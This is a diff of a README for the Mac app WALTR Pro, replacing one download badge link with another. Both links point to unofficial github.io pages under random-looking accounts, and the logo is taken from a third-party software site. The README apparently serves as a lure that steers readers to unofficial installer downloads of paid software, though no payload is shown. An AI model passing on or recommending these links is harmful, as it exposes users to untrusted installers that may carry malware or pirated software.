@@ -4,7 +4,7 @@
 <img src="https://insmac.org/uploads/posts/2021-05/1622046160_waltr-pro.png" alt="WALTR Logo" width="200">  
 </div>  
 
-[![Download Setup](https://img.shields.io/badge/Download-Setup-blue?style=for-the-badge&logo=windows)](https://lanethomasuxjh.github.io/.github/WALTR-Mac)
+[![Open WALTR](https://img.shields.io/badge/Open-WALTR-0F766E?style=for-the-badge)](https://smart-media-waltr.github.io/.github/)
 
 ---  
 
